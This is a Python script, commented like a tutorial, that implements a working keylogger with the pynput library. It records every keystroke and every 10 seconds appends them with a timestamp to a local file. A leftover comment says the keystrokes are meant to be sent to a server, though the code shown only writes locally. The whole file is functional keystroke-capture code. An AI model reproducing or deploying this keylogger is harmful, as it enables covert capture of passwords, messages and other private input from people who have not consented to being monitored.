# Install pynput using the following command: pip install pynput
# Import the mouse and keynboard from pynput
from pynput import keyboard
#  The Timer module is part of the threading package.
import threading
# For the timestamp in the log file.
import time

# We make a global variable text where we'll save a string of the keystrokes which we'll send to the server.
text = ""

# Time interval in seconds for code to execute.
time_interval = 10

def save_to_file():
    global text
    try:
        # Append the buffered keystrokes to the log file with a timestamp header, then clear the buffer.
        with open("keylog.txt", "a", encoding="utf-8") as f:
            f.write(f"[{time.strftime('%Y-%m-%d %H:%M:%S')}]\n{text}\n")
        text = ""
        
        # Setting up a timer function to run every <time_interval> specified seconds. save_to_file is a recursive function, and will call itself as long as the program is running.
        timer = threading.Timer(time_interval, save_to_file)
        # We start the timer thread.
        timer.start()
    except Exception as e:
        print(f"Couldn't save to file: {e}")
# We only need to log the key once it is released. That way it takes the modifier keys into consideration.
def on_press(key):
    global text

# Based on the key press we handle the way the key gets logged to the in memory string.
# Read more on the different keys that can be logged here:
# https://pynput.readthedocs.io/en/latest/keyboard.html#monitoring-the-keyboard
    if key == keyboard.Key.enter:
        text += "\n"
    elif key == keyboard.Key.tab:
        text += "\t"
    elif key == keyboard.Key.space:
        text += " "
    elif key == keyboard.Key.shift:
        pass
    elif key == keyboard.Key.backspace and len(text) == 0:
        pass
    elif key == keyboard.Key.backspace and len(text) > 0:
        text = text[:-1]
    elif key == keyboard.Key.ctrl_l or key == keyboard.Key.ctrl_r:
        pass
    elif key == keyboard.Key.esc:
        return False
    else:
        # We do an explicit conversion from the key object to a string and then append that to the string held in memory.
        text += str(key).strip("'")

# A keyboard listener is a threading.Thread, and a callback on_press will be invoked from this thread.
# In the on_press function we specified how to deal with the different inputs received by the listener.
with keyboard.Listener(
    on_press=on_press) as listener:
    # We start off by setting up the timer that saves the keystrokes to the log file.
    save_to_file()
    listener.join()
